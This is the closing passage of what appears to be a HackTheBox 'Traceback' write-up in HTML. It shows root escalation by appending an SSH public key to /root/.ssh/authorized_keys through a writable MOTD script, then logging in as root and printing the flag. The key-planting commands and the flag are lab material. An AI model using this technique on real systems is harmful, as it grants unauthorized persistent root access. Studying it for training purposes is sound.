+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-support z-function z-echo z-shell">echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICF8Vs9QFJ3VTFx5hxO0vISYAK1MiJdi5VUkFPq5zpIT<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;&gt;</span> /root/.ssh/authorized_keys</span>
+</span></code></pre>
+<p>Now, we just need to connect over SSH once again to trigger the MOTD and execute this file! Keep in mind that these files are reset every minute though, so we must be quick.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ssh sysadmin@10.10.10.181<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span> id_ed25519<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>N</span></span>
+</span></code></pre>
+<p>Now let's see if it worked:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ssh root@10.10.10.181<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span> id_ed25519</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">#################################
+</span><span class="z-text z-plain">-------- OWNED BY XH4H  ---------
+</span><span class="z-text z-plain">- I guess stuff could have been configured better ^^ -
+</span><span class="z-text z-plain">#################################
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Welcome to Xh4H land 
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">root@traceback:~#
+</span></code></pre>
+<p>And it did! We are now <code>root</code>!</p>
+<h1 id="local-enumeration-2">Local enumeration</h1>
+<h2 id="home-folder-2">Home folder</h2>
+<p>The only thing we need to do to finish this box is to retrieve the root flag. As usual, we can find it in our home folder!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">root@traceback:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>#</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>/root.txt</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">df341702627d6b3420892b2b6d186ac0
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/traceback/success.png" alt="Success" /></p>
+<p>That's it for this box! The foothold was easy to obtain, although having the idea of using OSINT to find the reverse shell was a bit hard to come by. The path to <code>root</code> was fairly easy afterwards.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
